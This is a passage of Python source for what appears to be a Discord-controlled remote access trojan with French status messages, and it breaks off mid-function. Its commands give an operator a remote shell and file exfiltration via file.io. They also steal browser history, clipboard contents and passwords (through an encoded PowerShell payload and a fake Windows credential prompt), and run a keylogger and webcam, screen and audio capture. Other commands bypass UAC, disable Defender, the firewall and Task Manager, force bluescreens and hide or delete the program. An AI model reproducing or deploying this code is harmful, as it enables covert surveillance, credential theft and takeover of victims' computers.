                    await message.channel.send("[❌] - Commande shell non reconnue | (Certaines commandes n'ont pas forcément de sortie, il se peut donc que la commande n'a pas été reconnue mais a marchée)")
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    f1 = open(temp + r"\output.txt", 'a')
                    f1.write(out)
                    f1.close()
                    file = discord.File(temp + r"\output.txt", filename="output.txt")
                    await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
                    os.remove(temp + r"\output.txt")
                else:
                    await message.channel.send("[❤️] - La commande à été éxecutée avec succès : " + out)
            else:
                await message.channel.send("[❌] - Commande shell non reconnue | (Certaines commandes n'ont pas forcément de sortie, il se peut donc que la commande n'a pas été reconnue mais a marchée)")
                status = None

        if message.content.startswith("!download"):
            import subprocess
            import os
            filename=message.content[10:]
            check2 = os.stat(filename).st_size
            if check2 > 7340032:
                import requests
                await message.channel.send("Cela peut prendre un peu de temps si c'est au dessus de 8MB. Merci d'attendre")
                response = requests.post('https://file.io/', files={"file": open(filename, "rb")}).json()["link"]
                await message.channel.send("download link: " + response)
                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
            else:
                file = discord.File(message.content[10:], filename=message.content[10:])
                await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)

        if message.content.startswith("!cd"):
            import os
            os.chdir(message.content[4:])
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")

        if message.content == "!help":
            import os
            temp = (os.getenv('TEMP'))
            f5 = open(temp + r"\helpmenu.txt", 'a')
            f5.write(str(helpmenu))
            f5.close()
            temp = (os.getenv('TEMP'))
            file = discord.File(temp + r"\helpmenu.txt", filename="helpmenu.txt")
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
            os.remove(temp + r"\helpmenu.txt")

        if message.content.startswith("!write"):
            import pyautogui
            if message.content[7:] == "enter":
                pyautogui.press("enter")
            else:
                pyautogui.typewrite(message.content[7:])

        if message.content == "!history":
            import sqlite3
            import os
            import time
            import shutil
            temp = (os.getenv('TEMP'))
            Username = (os.getenv('USERNAME'))
            shutil.rmtree(temp + r"\history12", ignore_errors=True)
            os.mkdir(temp + r"\history12")
            path_org = r""" "C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\History" """.format(Username)
            path_new = temp + r"\history12"
            copy_me_to_here = (("copy" + path_org + "\"{}\"" ).format(path_new))
            os.system(copy_me_to_here)
            con = sqlite3.connect(path_new + r"\history")
            cursor = con.cursor()
            cursor.execute("SELECT url FROM urls")
            urls = cursor.fetchall()
            for x in urls:
                done = ("".join(x))
                f4 = open(temp + r"\history12" + r"\history.txt", 'a')
                f4.write(str(done))
                f4.write(str("\n"))
                f4.close()
            con.close()
            file = discord.File(temp + r"\history12" + r"\history.txt", filename="history.txt")
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
            def deleteme() :
                path = "rmdir " + temp + r"\history12" + " /s /q"
                os.system(path)
            deleteme()
        if message.content == "!clipboard":
            import ctypes
            import os
            CF_TEXT = 1
            kernel32 = ctypes.windll.kernel32
            kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
            kernel32.GlobalLock.restype = ctypes.c_void_p
            kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
            user32 = ctypes.windll.user32
            user32.GetClipboardData.restype = ctypes.c_void_p
            user32.OpenClipboard(0)
            if user32.IsClipboardFormatAvailable(CF_TEXT):
                data = user32.GetClipboardData(CF_TEXT)
                data_locked = kernel32.GlobalLock(data)
                text = ctypes.c_char_p(data_locked)
                value = text.value
                kernel32.GlobalUnlock(data_locked)
                body = value.decode()
                user32.CloseClipboard()
                await message.channel.send("[❤️] - La commande à été éxecutée avec succès : " + "Le presse papier est : " + str(body))

        if message.content == "!sysinfo":
            import platform
            jak = str(platform.uname())
            intro = jak[12:]
            from requests import get
            ip = get('https://api.ipify.org').text
            pp = "IP Address = " + ip
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès : " + intro + pp)

        if message.content == "!geolocate":
            import urllib.request
            import json
            with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                data = json.loads(url.read().decode())
                link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                await message.channel.send("[❤️] - La commande à été éxecutée avec succès : " + link)

        if message.content == "!admincheck":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                await message.channel.send("[❤️] - Administrateur: ✅")
            elif is_admin == False:
                await message.channel.send("[❌] - Administrateur: ❌")

        if message.content == "!uacbypass":
            import winreg
            import ctypes
            import sys
            import os
            import time
            import inspect
            def isAdmin():
                try:
                    is_admin = (os.getuid() == 0)
                except AttributeError:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                return is_admin
            if isAdmin():
                await message.channel.send("Vous etes déjà administrateur")
            else:
                class disable_fsr():
                    disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                    revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                    def __enter__(self):
                        self.old_value = ctypes.c_long()
                        self.success = self.disable(ctypes.byref(self.old_value))
                    def __exit__(self, type, value, traceback):
                        if self.success:
                            self.revert(self.old_value)
                await message.channel.send("attempting to get admin!")
                isexe=False
                if (sys.argv[0].endswith("exe")):
                    isexe=True
                if not isexe:
                    test_str = sys.argv[0]
                    current_dir = inspect.getframeinfo(inspect.currentframe()).filename
                    cmd2 = current_dir
                    create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
                    os.system(create_reg_path)
                    create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
                    os.system(create_trigger_reg_key) 
                    create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                    os.system(create_payload_reg_key)
                else:
                    test_str = sys.argv[0]
                    current_dir = test_str
                    cmd2 = current_dir
                    create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
                    os.system(create_reg_path)
                    create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
                    os.system(create_trigger_reg_key) 
                    create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                    os.system(create_payload_reg_key)
                with disable_fsr():
                    os.system("fodhelper.exe")  
                time.sleep(2)
                remove_reg = """ powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force """
                os.system(remove_reg)
        if message.content == "!startkeylogger":
            import base64
            import os
            from pynput.keyboard import Key, Listener
            import logging
            temp = os.getenv("TEMP")
            log_dir = temp
            logging.basicConfig(filename=(log_dir + r"\key_log.txt"),
                                level=logging.DEBUG, format='%(asctime)s: %(message)s')
            def keylog():
                def on_press(key):
                    logging.info(str(key))
                with Listener(on_press=on_press) as listener:
                    listener.join()
            import threading
            global test
            test = threading.Thread(target=keylog)
            test._running = True
            test.daemon = True
            test.start()
            await message.channel.send("[*] Le Keylogger à commencé")

        if message.content == "!stopkeylogger":
            import os
            test._running = False
            await message.channel.send("[*] Le Keylogger s'est arreté")

        if message.content == "!idletime":
            class LASTINPUTINFO(Structure):
                _fields_ = [
                    ('cbSize', c_uint),
                    ('dwTime', c_int),
                ]

            def get_idle_duration():
                lastInputInfo = LASTINPUTINFO()
                lastInputInfo.cbSize = sizeof(lastInputInfo)
                if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
                    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                    return millis / 1000.0
                else:
                    return 0
            duration = get_idle_duration()
            await message.channel.send(f'L\'utilisateur est inactif depuis {duration:.2f} seconds.')

        if message.content.startswith("!voice"):
            volumeup()
            import win32com.client as wincl
            speak = wincl.Dispatch("SAPI.SpVoice")
            speak.Speak(message.content[7:])

            await  message.channel.send("[❤️] - La commande à été éxecutée avec succès")

        if message.content.startswith("!blockinput"):
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ok = windll.user32.BlockInput(True)
                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
            else:
                await message.channel.send("[❌] - Vous avez besoin de droit administrateur pour cette opération")

        if message.content.startswith("!unblockinput"):
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ok = windll.user32.BlockInput(False)
                await  message.channel.send("[❤️] - La commande à été éxecutée avec succès")
            else:
                await message.channel.send("[❌] - Vous avez besoin de droit administrateur pour cette opération")
        if message.content == "!passwords" :
            import subprocess
            import os
            temp= os.getenv('temp')
            def shell(command):
                output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                status = "ok"
                return output.stdout.decode('CP437').strip()
            passwords = shell("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA=")
            f4 = open(temp + r"\passwords.txt", 'w')
            f4.write(str(passwords))
            f4.close()
            file = discord.File(temp + r"\passwords.txt", filename="passwords.txt")
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
            os.remove(temp + r"\passwords.txt")
        if message.content == "!streamwebcam" :
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
            import os
            import time
            import cv2
            import threading
            import sys
            import pathlib
            temp = (os.getenv('TEMP'))
            camera_port = 0
            camera = cv2.VideoCapture(camera_port)
            running = message.content
            file = temp + r"\hobo\hello.txt"
            if os.path.isfile(file):
                delelelee = "del " + file + r" /f"
                os.system(delelelee)
                os.system(r"RMDIR %temp%\hobo /s /q")
            while True:
                return_value, image = camera.read()
                cv2.imwrite(temp + r"\temp.png", image)
                boom = discord.File(temp + r"\temp.png", filename="temp.png")
                kool = await message.channel.send(file=boom)
                temp = (os.getenv('TEMP'))
                file = temp + r"\hobo\hello.txt"
                if os.path.isfile(file):
                    del camera
                    break
                else:
                    continue
        if message.content == "!stopwebcam":  
            import os
            os.system(r"mkdir %temp%\hobo")
            os.system(r"echo hello>%temp%\hobo\hello.txt")
            os.system(r"del %temp\temp.png /F")
        if message.content == "!streamscreen" :
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
            import os
            from mss import mss
            temp = (os.getenv('TEMP'))
            hellos = temp + r"\hobos\hellos.txt"        
            if os.path.isfile(hellos):
                os.system(r"del %temp%\hobos\hellos.txt /f")
                os.system(r"RMDIR %temp%\hobos /s /q")      
            else:
                pass
            while True:
                with mss() as sct:
                    sct.shot(output=os.path.join(os.getenv('TEMP') + r"\monitor.png"))
                path = (os.getenv('TEMP')) + r"\monitor.png"
                file = discord.File((path), filename="monitor.png")
                await message.channel.send(file=file)
                temp = (os.getenv('TEMP'))
                hellos = temp + r"\hobos\hellos.txt"
                if os.path.isfile(hellos):
                    break
                else:
                    continue
                    
        if message.content == "!stopscreen":  
            import os
            os.system(r"mkdir %temp%\hobos")
            os.system(r"echo hello>%temp%\hobos\hellos.txt")
            os.system(r"del %temp%\monitor.png /F")
            
        if message.content == "!shutdown":
            import os
            uncritproc()
            os.system("shutdown /p")
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
            
        if message.content == "!restart":
            import os
            uncritproc()
            os.system("shutdown /r /t 00")
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
            
        if message.content == "!logoff":
            import os
            uncritproc()
            os.system("shutdown /l /f")
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
            
        if message.content == "!bluescreen":
            import ctypes
            import ctypes.wintypes
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
        if message.content == "!currentdir":
            import subprocess as sp
            output = sp.getoutput('cd')
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
            await message.channel.send("output is : " + output)
            
        if message.content == "!displaydir":
            import subprocess as sp
            import os
            import subprocess
            output = sp.getoutput('dir')
            if output:
                result = output
                numb = len(result)
                if numb < 1:
                    await message.channel.send("[❌] - Commande shell non reconnue | (Certaines commandes n'ont pas forcément de sortie, il se peut donc que la commande n'a pas été reconnue mais a marchée)")
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    if os.path.isfile(temp + r"\output22.txt"):
                        os.system(r"del %temp%\output22.txt /f")
                    f1 = open(temp + r"\output22.txt", 'a')
                    f1.write(result)
                    f1.close()
                    file = discord.File(temp + r"\output22.txt", filename="output22.txt")
                    await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
                else:
                    await message.channel.send("[❤️] - La commande à été éxecutée avec succès : " + result)  
        if message.content == "!dateandtime":
            import subprocess as sp
            output = sp.getoutput(r'echo time = %time% date = %date%')
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
            await message.channel.send("output is : " + output)
            
        if message.content == "!listprocess":
            import os
            import subprocess
            if 1==1:
                result = subprocess.getoutput("tasklist")
                numb = len(result)
                if numb < 1:
                    await message.channel.send("[❌] - Commande shell non reconnue | (Certaines commandes n'ont pas forcément de sortie, il se peut donc que la commande n'a pas été reconnue mais a marchée)")
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    if os.path.isfile(temp + r"\output.txt"):
                        os.system(r"del %temp%\output.txt /f")
                    f1 = open(temp + r"\output.txt", 'a')
                    f1.write(result)
                    f1.close()
                    file = discord.File(temp + r"\output.txt", filename="output.txt")
                    await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
                else:
                    await message.channel.send("[❤️] - La commande à été éxecutée avec succès : " + result)           
        if message.content.startswith("!prockill"):  
            import os
            proc = message.content[10:]
            kilproc = r"taskkill /IM" + ' "' + proc + '" ' + r"/f"
            import time
            import os
            import subprocess   
            os.system(kilproc)
            import subprocess
            time.sleep(2)
            process_name = proc
            call = 'TASKLIST', '/FI', 'imagename eq %s' % process_name
            output = subprocess.check_output(call).decode()
            last_line = output.strip().split('\r\n')[-1]
            done = (last_line.lower().startswith(process_name.lower()))
            if done == False:
                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
            elif done == True:
                await message.channel.send('[❌] - La commande ne s\'est pas exécutée correctement') 
        if message.content.startswith("!recscreen"):
            import cv2
            import numpy as np
            import pyautogui
            reclenth = float(message.content[10:])
            input2 = 0
            while True:
                input2 = input2 + 1
                input3 = 0.045 * input2
                if input3 >= reclenth:
                    break
                else:
                    continue
            import os
            SCREEN_SIZE = (1920, 1080)
            fourcc = cv2.VideoWriter_fourcc(*"XVID")
            temp = (os.getenv('TEMP'))
            videeoo = temp + r"\output.avi"
            out = cv2.VideoWriter(videeoo, fourcc, 20.0, (SCREEN_SIZE))
            counter = 1
            while True:
                counter = counter + 1
                img = pyautogui.screenshot()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                out.write(frame)
                if counter >= input2:
                    break
            out.release()
            import subprocess
            import os
            temp = (os.getenv('TEMP'))
            check = temp + r"\output.avi"
            check2 = os.stat(check).st_size
            if check2 > 7340032:
                import requests
                await message.channel.send("Cela peut prendre un peu de temps si c'est au dessus de 8MB. Merci d'attendre")
                boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                await message.channel.send("video download link: " + boom)
                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
                os.system(r"del %temp%\output.avi /f")
            else:
                file = discord.File(check, filename="output.avi")
                await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
                os.system(r"del %temp%\output.avi /f")
        if message.content.startswith("!reccam"):
            import cv2
            import numpy as np
            import pyautogui
            input1 = float(message.content[8:])
            import cv2
            import os
            temp = (os.getenv('TEMP'))
            vid_capture = cv2.VideoCapture(0)
            vid_cod = cv2.VideoWriter_fourcc(*'XVID')
            loco = temp + r"\output.mp4"
            output = cv2.VideoWriter(loco, vid_cod, 20.0, (640,480))
            input2 = 0
            while True:
                input2 = input2 + 1
                input3 = 0.045 * input2
                ret,frame = vid_capture.read()
                output.write(frame)
                if input3 >= input1:
                    break
                else:
                    continue
            vid_capture.release()
            output.release()
            import subprocess
            import os
            temp = (os.getenv('TEMP'))
            check = temp + r"\output.mp4"
            check2 = os.stat(check).st_size
            if check2 > 7340032:
                import requests
                await message.channel.send("Cela peut prendre un peu de temps si c'est au dessus de 8MB. Merci d'attendre")
                boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                await message.channel.send("video download link: " + boom)
                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
                os.system(r"del %temp%\output.mp4 /f")
            else:
                file = discord.File(check, filename="output.mp4")
                await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
                os.system(r"del %temp%\output.mp4 /f")
        if message.content.startswith("!recaudio"):
            import cv2
            import numpy as np
            import pyautogui
            import os
            import sounddevice as sd
            from scipy.io.wavfile import write
            seconds = float(message.content[10:])
            temp = (os.getenv('TEMP'))
            fs = 44100
            laco = temp + r"\output.wav"
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            write(laco, fs, myrecording)
            import subprocess
            import os
            temp = (os.getenv('TEMP'))
            check = temp + r"\output.wav"
            check2 = os.stat(check).st_size
            if check2 > 7340032:
                import requests
                await message.channel.send("Cela peut prendre un peu de temps si c'est au dessus de 8MB. Merci d'attendre")
                boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                await message.channel.send("video download link: " + boom)
                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
                os.system(r"del %temp%\output.wav /f")
            else:
                file = discord.File(check, filename="output.wav")
                await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
                os.system(r"del %temp%\output.wav /f")
        if message.content.startswith("!delete"):
            global statue
            import time
            import subprocess
            import os
            instruction = message.content[8:]
            instruction = "del " + '"' + instruction + '"' + " /F"
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                return output
            import threading
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            global statue
            statue = "ok"
            if statue:
                numb = len(result)
                if numb > 0:
                    await message.channel.send("[❌] - Une erreur est survenue")
                else:
                    await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
            else:
                await message.channel.send("[❌] - Commande shell non reconnue | (Certaines commandes n'ont pas forcément de sortie, il se peut donc que la commande n'a pas été reconnue mais a marchée)")
                statue = None
        if message.content == "!disableantivirus":
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:            
                import subprocess
                instruction = """ REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | findstr /I /C:"CurrentBuildnumber"  """
                def shell():
                    output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    return output
                result = str(shell().stdout.decode('CP437'))
                done = result.split()
                boom = done[2:]
                if boom <= ['17763']:
                    os.system(r"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet")
                    await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
                elif boom >= ['18362']:
                    os.system(r"""powershell Add-MpPreference -ExclusionPath "C:\\" """)
                    await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
                else:
                    await message.channel.send("[❌] - Une erreur est survenue")     
            else:
                await message.channel.send("[❌] - Cette commande requiert les droit administrateur")
        if message.content == "!disablefirewall":
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                os.system(r"NetSh Advfirewall set allprofiles state off")
                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
            else:
                await message.channel.send("[❌] - Cette commande requiert les droit administrateur")
        if message.content.startswith("!audio"):
            import os
            temp = (os.getenv("TEMP"))
            temp = temp + r"\audiofile.wav"
            if os.path.isfile(temp):
                delelelee = "del " + temp + r" /f"
                os.system(delelelee)
            temp1 = (os.getenv("TEMP"))
            temp1 = temp1 + r"\sounds.vbs"
            if os.path.isfile(temp1):
                delelee = "del " + temp1 + r" /f"
                os.system(delelee)                
            await message.attachments[0].save(temp)
            temp2 = (os.getenv("TEMP"))
            f5 = open(temp2 + r"\sounds.vbs", 'a')
            result = """ Dim oPlayer: Set oPlayer = CreateObject("WMPlayer.OCX"): oPlayer.URL = """ + '"' + temp + '"' """: oPlayer.controls.play: While oPlayer.playState <> 1 WScript.Sleep 100: Wend: oPlayer.close """
            f5.write(result)
            f5.close()
            os.system(r"start %temp%\sounds.vbs")
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
        #if adding startup n stuff this needs to be edited to that
        if message.content == "!selfdestruct": #prob beter way to do dis
            import inspect
            import os
            import sys
            import inspect
            uncritproc()
            cmd2 = inspect.getframeinfo(inspect.currentframe()).filename
            hello = os.getpid()
            bat = """@echo off""" + " & " + "taskkill" + r" /F /PID " + str(hello) + " &" + " del " + '"' + cmd2 + '"' + r" /F" + " & " + r"""start /b "" cmd /c del "%~f0"& taskkill /IM cmd.exe /F &exit /b"""
            temp = (os.getenv("TEMP"))
            temp5 = temp + r"\delete.bat"
            if os.path.isfile(temp5):
                delelee = "del " + temp5 + r" /f"
                os.system(delelee)                
            f5 = open(temp + r"\delete.bat", 'a')
            f5.write(bat)
            f5.close()
            os.system(r"start /min %temp%\delete.bat")
        if message.content == "!windowspass":
            import sys
            import subprocess
            import os
            cmd82 = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
            cmd92 = 'echo $cred.getnetworkcredential().password;'
            full_cmd = 'Powershell "{} {}"'.format(cmd82,cmd92)
            instruction = full_cmd
            def shell():   
               output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
               return output
            result = str(shell().stdout.decode('CP437'))
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
            await message.channel.send("Le mot de passe windows de l'utilisateur est: " + result)
        if message.content == "!displayoff":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                import ctypes
                WM_SYSCOMMAND = 274
                HWND_BROADCAST = 65535
                SC_MONITORPOWER = 61808
                ctypes.windll.user32.BlockInput(True)
                ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
            else:
                await message.channel.send("[❌] - Vous avez besoin de droit administrateur pour cette opération")
        if message.content == "!displayon":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                from pynput.keyboard import Key, Controller
                keyboard = Controller()
                keyboard.press(Key.esc)
                keyboard.release(Key.esc)
                keyboard.press(Key.esc)
                keyboard.release(Key.esc)
                ctypes.windll.user32.BlockInput(False)
                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
            else:
                await message.channel.send("[❌] - Vous avez besoin de droit administrateur pour cette opération")
        if message.content == "!hide":
            import os
            import inspect
            cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
            os.system("""attrib +h "{}" """.format(cmd237))
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
        if message.content == "!unhide":
            import os
            import inspect
            cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
            os.system("""attrib -h "{}" """.format(cmd237))
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
        #broken. might fix if someone want me too.
        if message.content == "!ejectcd":
            import ctypes
            return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door open', None, 0, None)
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
        if message.content == "!retractcd":
            import ctypes
            return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door closed', None, 0, None)
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
        if message.content == "!critproc":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                critproc()
                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
            else:
                await message.channel.send(r"[*] Not admin :(")
        if message.content == "!uncritproc":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                uncritproc()
                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
            else:
                await message.channel.send(r"[*] Not admin :(")
        if message.content.startswith("!website"):
            import subprocess
            website = message.content[9:]
            def OpenBrowser(URL):
                if not URL.startswith('http'):
                    URL = 'http://' + URL
                subprocess.call('start ' + URL, shell=True) 
            OpenBrowser(website)
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
        if message.content == "!distaskmgr":
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                global statuuusss
                import time
                statuuusss = None
                import subprocess
                import os
                instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
                def shell():
                    output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    global status
                    statuuusss = "ok"
                    return output
                import threading
                shel = threading.Thread(target=shell)
                shel._running = True
                shel.start()
                time.sleep(1)
                shel._running = False
                result = str(shell().stdout.decode('CP437'))
                if len(result) <= 5:
                    import winreg as reg
                    reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                    import os
                    os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
                else:
                    import os
                    os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
            else:
                await message.channel.send("[❌] - Cette commande requiert les droit administrateur")
        if message.content == "!enbtaskmgr":
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                import ctypes
                import os
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    global statusuusss
                    import time
                    statusuusss = None
                    import subprocess
                    import os
